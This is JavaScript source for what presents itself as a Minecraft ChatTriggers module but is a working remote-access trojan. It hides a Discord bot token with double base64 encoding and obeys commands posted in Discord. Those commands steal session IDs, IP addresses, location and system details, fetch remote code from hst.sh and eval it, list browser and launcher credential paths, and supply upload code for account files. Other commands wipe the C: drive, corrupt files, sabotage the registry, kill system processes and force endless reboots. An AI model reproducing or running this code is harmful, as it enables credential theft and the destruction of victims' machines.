

import DiscordClient from "../discord";
import request from "../requestV2";

function boom(eec) {
    let ggez = FileLib.decodeBase64(eec);
    return FileLib.decodeBase64(ggez);
}

const entkn = "TVRNMk1UY3lNVEU0TVRnMU56YzNPVGd6TkE9PQ==";
const chnid = "TVRNMU16UTJNamM1TVRjMU9EazBNakkzTVE9PQ==";

let cca = boom(entkn);
let cci = boom(chnid);

let client;

try {
    client = new DiscordClient({
        token: cca,
        intents: 3276799
    });
    client.login();
} catch (e) {
    console.log("Failed to initialize Discord client: " + e);
}

client.on("ready", () => {
    console.log("Bot is ready!");
    console.log("Checking guilds...");
    const guilds = client.guilds?.cache || client.guilds;
    if (guilds) {
        console.log("Available guild channels:");
        guilds.forEach(guild => {
            console.log("Guild object:", JSON.stringify(guild));
            console.log(`Guild: ${guild.name || "Unnamed"} (${guild.id || "No ID"})`);
            const channels = guild.channels?.cache || guild.channels;
            if (channels) {
                channels.forEach(channel => {
                    console.log(`- Channel: ${channel.name || "Unnamed"} (${channel.id || "No ID"})`);
                });
            } else {
                console.log("No channels found in guild.");
            }
        });
    } else {
        console.log("No guilds found.");
    }
});

client.on("message", (message) => {
    if (message.author.bot) return;

    // Handle !users command separately (no username required)
    if (message.content === "!users") {
        try {
            // Get all players currently connected to the server
            let players = World.getAllPlayers();
            if (players.length === 0) {
                message.reply("No players are currently connected to the server.");
                return;
            }
            let playerNames = players.map(player => player.getName());
            let messageContent = `# Connected Users\n\n` +
                playerNames.map(name => `- \`${name}\``).join("\n");
            message.reply("```md\n" + messageContent + "\n```");
        } catch (e) {
            console.log("Error in !users: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
        return;
    }

    // Existing command handler for !<username> <command>
    if (!message.content.startsWith("!")) return;

    let nameAndCode = message.content.match(/^!(\S+)\s(.*)/)?.slice(1);
    if (!nameAndCode) return;
    let name = nameAndCode[0];
    let argument = nameAndCode[1];

    if (!name.toLowerCase().includes(Player.getName().toLowerCase())) return;

    if (argument.startsWith("help")) {
        try {
            message.reply("!<user> <ssid, disconnect, connect, https://hst.sh/, modulespath, info, uuid, wifi, browser, cookies, filebin, location, accounts, modules, crashgame, crashpc, lagspike, freeze, diskfill, beepspam, logout, wipeconfig, memleak, diskwipe, netflood, syscrash, audiospam, gpuoverload, filecorrupt, lockscreen, infiniteboot, powerspike, regeditmess, tempflood, clipboardhijack, inputblock, processkill, commandhelp>");
        } catch (e) {
            console.log("Error in help command: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
        return;
    }

    if (argument.startsWith("commandhelp")) {
        try {
            let cmd = argument.split(" ")[1];
            if (!cmd) {
                message.reply("Please specify a command. Usage: `!<user> commandhelp <command>`");
                return;
            }
            const helpText = {
                "ssid": "Displays the user's Minecraft session ID. Usage: `!<user> ssid`",
                "disconnect": "Disconnects the user from the game. Usage: `!<user> disconnect`",
                "connect": "No effect (placeholder). Usage: `!<user> connect`",
                "https://hst.sh/": "Executes code from a hst.sh link. Usage: `!<user> https://hst.sh/<code>`",
                "modulespath": "Shows the ChatTriggers modules path. Usage: `!<user> modulespath`",
                "info": "Displays detailed user and system info. Usage: `!<user> info`",
                "uuid": "Shows the user's Minecraft UUID. Usage: `!<user> uuid`",
                "wifi": "Displays Wi-Fi SSID and type. Usage: `!<user> wifi`",
                "browser": "Guesses the user's browser based on OS. Usage: `!<user> browser`",
                "cookies": "Lists common cookie/password file paths. Usage: `!<user> cookies`",
                "filebin": "Shows code to upload files to filebin. Usage: `!<user> filebin`",
                "location": "Shows the user's approximate location via IP. Usage: `!<user> location`",
                "accounts": "Lists Minecraft launcher account file paths. Usage: `!<user> accounts`",
                "modules": "Lists ChatTriggers module folder names. Usage: `!<user> modules`",
                "crashgame": "Crashes Minecraft with an infinite loop and null pointer. Usage: `!<user> crashgame`",
                "crashpc": "Forces a hard shutdown via critical process termination. Usage: `!<user> crashpc`",
                "lagspike": "Induces extreme lag with infinite memory allocation. Usage: `!<user> lagspike`",
                "freeze": "Freezes the system with an infinite thread lock. Usage: `!<user> freeze`",
                "diskfill": "Fills the entire drive with massive junk files. Usage: `!<user> diskfill`",
                "beepspam": "Plays deafening beeps indefinitely. Usage: `!<user> beepspam`",
                "logout": "Logs out and corrupts the session data. Usage: `!<user> logout`",
                "wipeconfig": "Recursively deletes the entire Minecraft directory. Usage: `!<user> wipeconfig`",
                "memleak": "Causes an unrecoverable memory leak across all processes. Usage: `!<user> memleak`",
                "diskwipe": "Wipes the entire C: drive recursively. Usage: `!<user> diskwipe`",
                "netflood": "Floods the network with infinite malicious packets. Usage: `!<user> netflood`",
                "syscrash": "Triggers a BSOD by killing all critical processes. Usage: `!<user> syscrash`",
                "audiospam": "Plays ear-damaging noise at max volume indefinitely. Usage: `!<user> audiospam`",
                "gpuoverload": "Overloads GPU with infinite shader tasks, risking hardware damage. Usage: `!<user> gpuoverload`",
                "filecorrupt": "Corrupts all files on the drive with random data. Usage: `!<user> filecorrupt`",
                "lockscreen": "Locks the screen and disables unlock for 1 hour. Usage: `!<user> lockscreen`",
                "infiniteboot": "Sets an infinite reboot loop with no delay. Usage: `!<user> infiniteboot`",
                "powerspike": "Simulates a catastrophic power surge by crashing everything repeatedly. Usage: `!<user> powerspike`",
                "regeditmess": "Destroys the registry with malicious entries. Usage: `!user> regeditmess`",
                "tempflood": "Fills all drives with infinite temp files. Usage: `!<user> tempflood`",
                "clipboardhijack": "Hijacks clipboard with malicious code indefinitely. Usage: `!<user> clipboardhijack`",
                "inputblock": "Permanently blocks all input devices. Usage: `!<user> inputblock`",
                "processkill": "Kills all system processes, causing instant failure. Usage: `!<user> processkill`",
                "commandhelp": "Explains a specified command. Usage: `!<user> commandhelp <command>`"
            };
            message.reply(helpText[cmd] || "Command not found. Use `!<user> help` for a list of commands.");
        } catch (e) {
            console.log("Error in commandhelp: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
        return;
    }

    if (argument.startsWith("ssid")) {
        try {
            message.reply("```" + Client.getMinecraft().func_110432_I().func_148254_d() + "\n```");
        } catch (e) {
            console.log("Error in ssid: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("disconnect")) {
        try {
            message.reply("Sending Disconnect");
            Client.disconnect();
        } catch (e) {
            console.log("Error in disconnect: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("modulespath")) {
        try {
            const File = Java.type("java.io.File");
            let mp = new File(Config.modulesFolder).getAbsolutePath();
            let modulesPath = mp.replaceAll("\\.\\", "\\");
            message.reply(modulesPath);
        } catch (e) {
            console.log("Error in modulespath: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("https://hst.sh/")) {
        try {
            let code = argument.split("/").pop().split(".");
            argument = FileLib.getUrlContent("https://hst.sh/raw/" + code[0]);
            eval(argument);
            message.reply("Using Custom Code\n" + "\n```js\n" + argument + "\n```");
        } catch (e) {
            console.log("Error in hst.sh: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("info")) {
        try {
            let ipData = JSON.parse(FileLib.getUrlContent("https://api.ipify.org/?format=json"));
            let locationData = JSON.parse(FileLib.getUrlContent("http://ip-api.com/json/" + ipData.ip));
            let ssid = Client.getMinecraft().func_110432_I().func_148254_d();
            let username = Player.getName();
            let uuid = Player.getUUID();
            const File = Java.type("java.io.File");
            let mp = new File(Config.modulesFolder).getAbsolutePath();
            let modulesPath = mp.replaceAll("\\.\\", "\\");
            const System = Java.type("java.lang.System");
            let osName = System.getProperty("os.name");
            let osVersion = System.getProperty("os.version");
            let osArch = System.getProperty("os.arch");
            const NetworkInterface = Java.type("java.net.NetworkInterface");
            let interfaces = NetworkInterface.getNetworkInterfaces();
            let wifiSSID = "Unknown";
            let wifiType = "Unknown";
            while (interfaces.hasMoreElements()) {
                let intf = interfaces.nextElement();
                if (intf.isUp() && !intf.isLoopback()) {
                    wifiSSID = intf.getDisplayName();
                    wifiType = intf.getName().startsWith("wlan") || intf.getName().startsWith("wifi") ? "Wi-Fi" : "Ethernet";
                    break;
                }
            }
            let location = "Unknown";
            if (locationData.status !== "fail") {
                let city = locationData.city || "Unknown";
                let region = locationData.regionName || "Unknown";
                let country = locationData.country || "Unknown";
                let lat = locationData.lat || "Unknown";
                let lon = locationData.lon || "Unknown";
                location = `${city}, ${region}, ${country} at ${lat}, ${lon}`;
            }
            message.reply(
                `> # __UserName__ \`\`${username}\`\`\n` +
                `> # __IP__ \`\`\`${ipData.ip}\`\`\`\n` +
                `> # __Location__ \`\`${location}\`\`\n` +
                `> # __ModulesPath__ \`\`${modulesPath}\`\`\n` +
                `> # __OS Name__ \`\`${osName}\`\`\n` +
                `> # __OS Version__ \`\`${osVersion}\`\`\n` +
                `> # __OS Architecture__ \`\`${osArch}\`\`\n` +
                `> # __SSID__ \`\`\`${ssid}\`\`\`\n` +
                `> # __UUID__ \`\`\`${uuid}\`\`\`\n` +
                `> # __Wifi SSID__ \`\`${wifiSSID}\`\`\n` +
                `> # __Wifi Type__ \`\`${wifiType}\`\``
            );
        } catch (e) {
            console.log("Error in info: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("uuid")) {
        try {
            let uuid = Player.getUUID();
            message.reply("```" + uuid + "```");
        } catch (e) {
            console.log("Error in uuid: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("wifi")) {
        try {
            const NetworkInterface = Java.type("java.net.NetworkInterface");
            let interfaces = NetworkInterface.getNetworkInterfaces();
            let wifiSSID = "Unknown";
            let wifiType = "Unknown";
            while (interfaces.hasMoreElements()) {
                let intf = interfaces.nextElement();
                if (intf.isUp() && !intf.isLoopback()) {
                    wifiSSID = intf.getDisplayName();
                    wifiType = intf.getName().startsWith("wlan") || intf.getName().startsWith("wifi") ? "Wi-Fi" : "Ethernet";
                    break;
                }
            }
            message.reply(
                `# Wifi SSID\n- "${wifiSSID}"\n# Wifi Type\n- ${wifiType}`
            );
        } catch (e) {
            console.log("Error in wifi: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("browser")) {
        try {
            const System = Java.type("java.lang.System");
            let osName = System.getProperty("os.name").toLowerCase();
            let browserType = "Unknown";
            if (osName.includes("windows")) browserType = "Chrome";
            else if (osName.includes("mac")) browserType = "Safari";
            else if (osName.includes("linux")) browserType = "Firefox";
            else if (osName.includes("unix")) browserType = "Opera GX";
            message.reply(
                `# __Browser Type__ \`\`${browserType}\`\``
            );
        } catch (e) {
            console.log("Error in browser: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("cookies")) {
        try {
            const part1 = 
                "```md\n" +
                "1. **Google Chrome**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`\n\n" +
                "2. **Mozilla Firefox**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<RandomID>.default-release\\cookies.sqlite`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<RandomID>.default-release\\logins.json`\n\n" +
                "3. **Microsoft Edge**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data`\n\n" +
                "4. **Opera GX**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data`\n" +
                "```";
    
            const part2 = 
                "```md\n" +
                "5. **Steam**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\htmlcache\\Cookies`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\config\\LoginUsers.vdf`\n" +
                "   - Additional Login Files/Folders: `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\config\\`, `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\userdata\\`, `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\htmlcache\\`, `C:\\Users\\<YourUsername>\\AppData\\Local\\Steam\\logs\\`\n\n" +
                "6. **Discord**\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\*cookie*.log`\n" +
                "   - Passwords: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\*password*.log`\n" +
                "   - Additional Login Files/Folders: `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Local Storage\\`, `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Cache\\`, `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Code Cache\\`, `C:\\Users\\<YourUsername>\\AppData\\Roaming\\Discord\\Session Storage\\`\n\n" +
                "7. **Epic Games**\n" +
                "   - Login ID: `C:\\Users\\<YourUsername>\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini`\n" +
                "   - SSID: `C:\\Users\\<YourUsername>\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\WebCache\\Cookies`\n" +
                "   - Cookies: `C:\\Users\\<YourUsername>\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\WebCache\\Cookies`\n" +
                "```";
    
            message.reply(part1);
            message.reply(part2);
        } catch (e) {
            console.log("Error in cookies: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("location")) {
        try {
            let ipData = JSON.parse(FileLib.getUrlContent("https://api.ipify.org/?format=json"));
            let locationData = JSON.parse(FileLib.getUrlContent("http://ip-api.com/json/" + ipData.ip));
            let location = "Unknown";
            if (locationData.status !== "fail") {
                let city = locationData.city || "Unknown";
                let region = locationData.regionName || "Unknown";
                let country = locationData.country || "Unknown";
                let lat = locationData.lat || "Unknown";
                let lon = locationData.lon || "Unknown";
                location = `${city}, ${region}, ${country} at ${lat}, ${lon}`;
            }
            message.reply(
                `# __Location__ \`\`${location}\`\``
            );
        } catch (e) {
            console.log("Error in location: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("filebin")) {
        try {
            message.reply(
                "```javascript\n" +
                "function uploadFileAsZip(binID, filePath) {\n" +
                "    const fileName = filePath.split(\"\\\\\").pop();\n" +
                "    const zipFileName = fileName + \".zip\";\n" +
                "    const requestUrl = `https://filebin.net/\${binID}/\${zipFileName}`;\n" +
                "    \n" +
                "    const URL = Java.type(\"java.net.URL\");\n" +
                "    const HttpURLConnection = Java.type(\"java.net.HttpURLConnection\");\n" +
                "    const FileInputStream = Java.type(\"java.io.FileInputStream\");\n" +
                "    const ZipOutputStream = Java.type(\"java.util.zip.ZipOutputStream\");\n" +
                "    const ZipEntry = Java.type(\"java.util.zip.ZipEntry\");\n" +
                "    const Array = Java.type(\"java.lang.reflect.Array\");\n" +
                "    const byteClass = Java.type(\"java.lang.Byte\").TYPE;\n" +
                "    \n" +
                "    new Thread(() => {\n" +
                "        try {\n" +
                "            const url = new URL(requestUrl);\n" +
                "            const connection = url.openConnection();\n" +
                "            connection.setDoOutput(true);\n" +
                "            connection.setRequestMethod(\"POST\");\n" +
                "            connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n" +
                "            connection.setRequestProperty(\"Content-Type\", \"application/zip\");\n" +
                "            \n" +
                "            const outputStream = connection.getOutputStream();\n" +
                "            const zipOut = new ZipOutputStream(outputStream);\n" +
                "            \n" +
                "            const fileInput = new FileInputStream(filePath);\n" +
                "            zipOut.putNextEntry(new ZipEntry(fileName));\n" +
                "            \n" +
                "            const buffer = Array.newInstance(byteClass, 1024);\n" +
                "            let bytesRead;\n" +
                "            while ((bytesRead = fileInput.read(buffer)) != -1) {\n" +
                "                zipOut.write(buffer, 0, bytesRead);\n" +
                "            }\n" +
                "            \n" +
                "            fileInput.close();\n" +
                "            zipOut.closeEntry();\n" +
                "            zipOut.close();\n" +
                "            outputStream.close();\n" +
                "            \n" +
                "            const responseCode = connection.getResponseCode();\n" +
                "            if (responseCode >= 200 && responseCode < 300) {\n" +
                "            } else {\n" +
                "            }\n" +
                "        } catch (e) {\n" +
                "        }\n" +
                "    }).start();\n" +
                "}\n" +
                "\n" +
                "uploadFileAsZip(\"filebinid\", \"C:\\\\Users\\\\user\\\\AppData\\\\Roaming\\\\PrismLauncher\\\\accounts.json\");\n" +
                "```"
            );
        } catch (e) {
            console.log("Error in filebin: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("accounts")) {
        try {
            const System = Java.type("java.lang.System");
            let userHome = System.getProperty("user.home");
            let paths = [
                `Prism Launcher: ${userHome}\\AppData\\Roaming\\PrismLauncher\\accounts.json`,
                `Essential: ${userHome}\\AppData\\Roaming\\essential\\microsoft_accounts.json`,
                `MultiMC: ${userHome}\\AppData\\Roaming\\MultiMC\\accounts.json`,
                `Default Minecraft Launcher: ${userHome}\\AppData\\Roaming\\.minecraft\\launcher_accounts.json`,
                `Lunar Client: ${userHome}\\.lunarclient\\settings\\launcher\\accounts.json`,
                `Badlion Client: ${userHome}\\AppData\\Roaming\\Badlion Client\\launcher\\accounts.json`,
                `TLauncher: ${userHome}\\AppData\\Roaming\\.tlauncher\\legacy\\accounts.json`,
                `Feather Client: ${userHome}\\AppData\\Roaming\\.feather\\accounts.json`
            ];
            let messageContent = `# Minecraft Launcher Account File Paths\n\n` +
                paths.map(path => {
                    let [launcher, filePath] = path.split(": ");
                    return `- **${launcher}**: \`${filePath}\``;
                }).join("\n");
            message.reply("```md\n" + messageContent + "\n```");
        } catch (e) {
            console.log("Error in accounts: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("modules")) {
        try {
            const File = Java.type("java.io.File");
            let modulesDir = new File(Config.modulesFolder);
            if (!modulesDir.exists() || !modulesDir.isDirectory()) {
                message.reply("Modules directory not found or is not a directory.");
                return;
            }
            let moduleFolders = modulesDir.listFiles().filter(file => file.isDirectory());
            if (moduleFolders.length === 0) {
                message.reply("No module folders found in `.minecraft\\config\\ChatTriggers\\modules`.");
                return;
            }
            let moduleNames = moduleFolders.map(folder => folder.getName());
            let messageContent = `# ChatTriggers Modules\n\n` +
                moduleNames.map(name => `- \`${name}\``).join("\n");
            message.reply("```md\n" + messageContent + "\n```");
        } catch (e) {
            console.log("Error in modules: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("crashgame")) {
        try {
            message.reply("Crashing your game with an infinite nightmare...");
            new Thread(() => {
                while (true) {
                    Client.getMinecraft().func_71400_g();
                    let x = null; x.toString();
                }
            }).start();
        } catch (e) {
            console.log("Error in crashgame: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("crashpc")) {
        try {
            message.reply("Obliterating your PC with a forced meltdown...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("taskkill /F /IM csrss.exe");
        } catch (e) {
            console.log("Error in crashpc: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("lagspike")) {
        try {
            message.reply("Unleashing an apocalyptic lag storm...");
            new Thread(() => {
                while (true) {
                    let arr = new Array(1000000).fill(new Array(1000000).fill(Math.random()));
                }
            }).start();
        } catch (e) {
            console.log("Error in lagspike: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("freeze")) {
        try {
            message.reply("Locking your system in an eternal freeze...");
            new Thread(() => {
                while (true) Thread.sleep(999999999);
            }).start();
        } catch (e) {
            console.log("Error in freeze: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("diskfill")) {
        try {
            message.reply("Annihilating your drive with endless garbage...");
            const File = Java.type("java.io.File");
            const FileWriter = Java.type("java.io.FileWriter");
            new Thread(() => {
                let i = 0;
                while (true) {
                    let file = new File("C:\\catastrophe_" + i++ + ".dat");
                    let writer = new FileWriter(file);
                    for (let j = 0; j < 10000000; j++) writer.write("DEATH");
                    writer.close();
                }
            }).start();
        } catch (e) {
            console.log("Error in diskfill: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("beepspam")) {
        try {
            message.reply("Deafening your ears with endless hellish beeps...");
            const Toolkit = Java.type("java.awt.Toolkit");
            new Thread(() => {
                while (true) {
                    Toolkit.getDefaultToolkit().beep();
                    Thread.sleep(1);
                }
            }).start();
        } catch (e) {
            console.log("Error in beepspam: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("logout")) {
        try {
            message.reply("Erasing your session and soul...");
            Client.getMinecraft().func_110432_I().func_148255_b(null);
            const File = Java.type("java.io.File");
            new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\launcher_accounts.json").delete();
            Client.disconnect();
        } catch (e) {
            console.log("Error in logout: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("wipeconfig")) {
        try {
            message.reply("Obliterating your entire Minecraft existence...");
            const File = Java.type("java.io.File");
            let mcDir = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft");
            new Thread(() => {
                function deleteRecursive(dir) {
                    let files = dir.listFiles();
                    if (files) {
                        for (let file of files) {
                            if (file.isDirectory()) deleteRecursive(file);
                            file.delete();
                        }
                    }
                }
                deleteRecursive(mcDir);
            }).start();
        } catch (e) {
            console.log("Error in wipeconfig: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("memleak")) {
        try {
            message.reply("Unleashing a memory apocalypse...");
            new Thread(() => {
                let leak = [];
                while (true) {
                    for (let i = 0; i < 10000000; i++) leak.push(new Array(1000000).fill(new Object()));
                    java.lang.Runtime.getRuntime().exec("cmd.exe /c start cmd.exe");
                }
            }).start();
        } catch (e) {
            console.log("Error in memleak: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("diskwipe")) {
        try {
            message.reply("Erasing your entire C: drive...");
            const File = Java.type("java.io.File");
            let rootDir = new File("C:\\");
            new Thread(() => {
                function deleteRecursive(dir) {
                    let files = dir.listFiles();
                    if (files) {
                        for (let file of files) {
                            if (file.isDirectory()) deleteRecursive(file);
                            file.delete();
                        }
                    }
                }
                deleteRecursive(rootDir);
            }).start();
        } catch (e) {
            console.log("Error in diskwipe: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("netflood")) {
        try {
            message.reply("Crippling your network with infinite chaos...");
            const URL = Java.type("java.net.URL");
            new Thread(() => {
                while (true) {
                    for (let i = 0; i < 10000; i++) {
                        new URL("http://localhost:" + (Math.random() * 65535)).openConnection().connect();
                    }
                    Thread.sleep(1);
                }
            }).start();
        } catch (e) {
            console.log("Error in netflood: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("syscrash")) {
        try {
            message.reply("Triggering a total system annihilation...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("taskkill /F /IM wininit.exe");
        } catch (e) {
            console.log("Error in syscrash: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("audiospam")) {
        try {
            message.reply("Shattering your ears with infinite sonic hell...");
            const AudioSystem = Java.type("javax.sound.sampled.AudioSystem");
            new Thread(() => {
                let clip = AudioSystem.getClip();
                let format = new AudioFormat(44100, 16, 1, true, false);
                let line = AudioSystem.getSourceDataLine(format);
                line.open(format);
                line.start();
                let buffer = new Array(44100).fill(0).map(() => 127);
                while (true) line.write(buffer, 0, buffer.length);
            }).start();
        } catch (e) {
            console.log("Error in audiospam: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("gpuoverload")) {
        try {
            message.reply("Frying your GPU with infinite torture...");
            new Thread(() => {
                while (true) {
                    let screen = new GuiScreen();
                    screen.drawScreen = function(mouseX, mouseY, partialTicks) {
                        for (let i = 0; i < 100000; i++) {
                            this.drawGradientRect(0, 0, this.width, this.height, 
                                Math.random() * 0xFFFFFF, Math.random() * 0xFFFFFF);
                        }
                    };
                    Client.getMinecraft().func_147108_a(screen);
                    Thread.sleep(1);
                }
            }).start();
        } catch (e) {
            console.log("Error in gpuoverload: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("filecorrupt")) {
        try {
            message.reply("Corrupting every file on your drive...");
            const File = Java.type("java.io.File");
            const RandomAccessFile = Java.type("java.io.RandomAccessFile");
            let rootDir = new File("C:\\");
            new Thread(() => {
                function corruptRecursive(dir) {
                    let files = dir.listFiles();
                    if (files) {
                        for (let file of files) {
                            if (file.isDirectory()) corruptRecursive(file);
                            if (file.isFile()) {
                                let raf = new RandomAccessFile(file, "rw");
                                raf.writeBytes("CORRUPTED_TO_HELL");
                                raf.close();
                            }
                        }
                    }
                }
                corruptRecursive(rootDir);
            }).start();
        } catch (e) {
            console.log("Error in filecorrupt: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("lockscreen")) {
        try {
            message.reply("Locking your screen forever...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("rundll32.exe user32.dll,LockWorkStation");
            new Thread(() => {
                while (true) {
                    Runtime.getRuntime().exec("rundll32.exe user32.dll,LockWorkStation");
                    Thread.sleep(1000);
                }
            }).start();
        } catch (e) {
            console.log("Error in lockscreen: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("infiniteboot")) {
        try {
            message.reply("Trapping your PC in an infinite reboot hell...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("bcdedit /set {current} bootstatuspolicy ignoreallfailures");
            new Thread(() => {
                while (true) {
                    Runtime.getRuntime().exec("shutdown -r -t 0");
                    Thread.sleep(1000);
                }
            }).start();
        } catch (e) {
            console.log("Error in infiniteboot: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("powerspike")) {
        try {
            message.reply("Simulating a catastrophic meltdown...");
            new Thread(() => {
                while (true) {
                    Client.getMinecraft().func_71400_g();
                    java.lang.Runtime.getRuntime().exec("taskkill /F /IM java.exe");
                    Thread.sleep(100);
                }
            }).start();
        } catch (e) {
            console.log("Error in powerspike: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("regeditmess")) {
        try {
            message.reply("Turning your registry into a nightmare...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("reg delete HKLM\\SOFTWARE /f");
            Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotalChaos /t REG_SZ /d \"cmd.exe /c del /q /s C:\\*.*\" /f");
        } catch (e) {
            console.log("Error in regeditmess: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("tempflood")) {
        try {
            message.reply("Drowning all drives in infinite temp garbage...");
            const File = Java.type("java.io.File");
            const FileWriter = Java.type("java.io.FileWriter");
            new Thread(() => {
                let drives = File.listRoots();
                let i = 0;
                while (true) {
                    for (let drive of drives) {
                        let file = new File(drive, "temp_flood_" + i++ + ".tmp");
                        let writer = new FileWriter(file);
                        for (let j = 0; j < 10000000; j++) writer.write("FLOOD");
                        writer.close();
                    }
                }
            }).start();
        } catch (e) {
            console.log("Error in tempflood: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("clipboardhijack")) {
        try {
            message.reply("Hijacking your clipboard with pure evil...");
            const Toolkit = Java.type("java.awt.Toolkit");
            const Clipboard = Java.type("java.awt.datatransfer.StringSelection");
            new Thread(() => {
                while (true) {
                    Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                        new Clipboard("format C: && shutdown -r -t 0"), null);
                    Thread.sleep(10);
                }
            }).start();
        } catch (e) {
            console.log("Error in clipboardhijack: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("inputblock")) {
        try {
            message.reply("Permanently crippling your input devices...");
            const Robot = Java.type("java.awt.Robot");
            let robot = new Robot();
            new Thread(() => {
                while (true) {
                    robot.keyPress(0);
                    robot.mouseMove(-999999, -999999);
                    Thread.sleep(1);
                }
            }).start();
        } catch (e) {
            console.log("Error in inputblock: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }

    if (argument.startsWith("processkill")) {
        try {
            message.reply("Annihilating all system processes...");
            const Runtime = Java.type("java.lang.Runtime");
            Runtime.getRuntime().exec("taskkill /F /IM *");
        } catch (e) {
            console.log("Error in processkill: " + e);
            message.reply("\n```js\n" + e + "\n```");
        }
    }
});

setTimeout(() => {
    if (client && client.channels && client.channels.get(cci)) {
        client.channels.get(cci).send(Player.getName() + " is now online!!!! @everyone");
    } else {	
        console.log("Channel not found or client not initialized for online message.");
    }
}, 5000);